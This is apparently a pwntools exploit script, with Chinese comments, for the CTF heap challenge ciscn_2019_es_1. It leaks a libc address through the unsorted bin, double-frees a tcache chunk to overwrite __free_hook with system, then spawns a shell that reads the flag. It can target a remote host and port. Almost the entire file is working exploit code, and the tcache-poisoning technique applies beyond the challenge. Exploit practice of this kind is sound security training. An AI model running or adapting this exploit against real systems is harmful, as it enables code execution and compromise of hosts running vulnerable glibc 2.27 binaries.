import os
import sys
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'
# ---- libc 符号表来源 ----
#   本地: 直接用目标机 /lib/x86_64-linux-gnu/libc.so.6 的符号 + /proc/pid/maps 读真实基址, 不背偏移
#   远程: 第三个参数给对应 libc 文件
REMOTE = len(sys.argv) >= 3
LIBCPATH = sys.argv[3] if len(sys.argv) > 3 else '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(LIBCPATH, checksec=False)
if REMOTE:
    io = remote(sys.argv[1], int(sys.argv[2]))
else:
    # 系统 libc 若带 2.29 风格 tcache key 校验(双 free 会 SIGABRT),
    # 优先用 glibc-all-in-one 的 ld-2.27.so 显式加载
    LDPATH = os.environ.get('LD27', './ld-2.27.so')
    if os.path.exists(LDPATH):
        io = process([LDPATH, './ciscn_2019_es_1'], env={'LD_LIBRARY_PATH': '.'})
    else:
        log.warning('没有 ld-2.27.so, 尝试用系统 libc 直跑(需真 2.27 才能通过双 free)')
        io = process('./ciscn_2019_es_1')
def add(size, name, call_):
    io.sendlineafter(b'choice:', b'1')
    io.sendlineafter(b"compary's name", str(size).encode())
    io.sendafter(b'input name:', name)
    io.sendafter(b'call:', call_)
def show(idx):
    io.sendlineafter(b'choice:', b'2')
    io.sendlineafter(b'index:', str(idx).encode())
def call(idx):
    io.sendlineafter(b'choice:', b'3')
    io.sendlineafter(b'index:', str(idx).encode())
# 1. 布堆: 0=unsorted 泄露用, 1=tcache dup 用, 2=/bin/sh
add(0x410, b'aaa\x00', b'111\x00')        # idx0  B0(0x420) -> unsorted
add(0x28,  b'dup',     b'dup')            # idx1  B1(0x30 chunk, 和 A 的 0x20 chunk 分 bin)
add(0x28,  b'/bin/sh\x00', b'sh\x00')     # idx2  B2 存 shell 字符串
# 2. 泄露 libc
call(0)                                    # B0 -> unsorted bin, fd = main_arena+96
show(0)
io.recvuntil(b'name:\n')
leak = u64(io.recv(6).ljust(8, b'\x00'))
log.success('leak = %#x' % leak)
if REMOTE:
    # 常规 2.27 关系: unsorted fd 偏移 = __malloc_hook 偏移 + 0x70
    libc_base = leak - (libc.sym['__malloc_hook'] + 0x70)
else:
    # 本地: 直接从 /proc/<pid>/maps 读 libc 真实基址, 偏移全部自适应
    libc_base = None
    for line in open('/proc/%d/maps' % io.pid).read().splitlines():
        if 'libc.so' in line or 'libc-2' in line:
            libc_base = int(line.split('-')[0], 16)
            break
    assert libc_base is not None, 'maps 里没找到 libc 映射'
    diff = leak - libc_base
    assert diff & 0xfff in (0xca0, 0xce0), \
        'leak - base = %#x, 月份偏移不属于 main_arena+96 常见低位, 核对环境' % diff
libc.address = libc_base
free_hook = libc.sym['__free_hook']
system    = libc.sym['system']
log.success('libc_base = %#x' % libc_base)
log.success('free_hook = %#x, system = %#x' % (free_hook, system))
# 3. tcache dup -> 篡改 __free_hook
call(1)
call(1)                                    # 双 free 同一块, 2.27 tcache 不报
add(0x28, p64(free_hook), b'x')            # 弹出 B1 当 B, 写 fd = free_hook
add(0x28, b'fill', b'x')                   # 再弹一次(链到 free_hook 前的占位)
add(0x28, p64(system), b'x')               # 弹出 "free_hook 块", name 写 system 进 __free_hook
# 4. free B2 -> system("/bin/sh")
io.sendlineafter(b'choice:', b'3')
io.sendlineafter(b'index:', b'2')
io.sendline(b'echo === PWNED; id; cat flag* 2>/dev/null')
io.interactive()
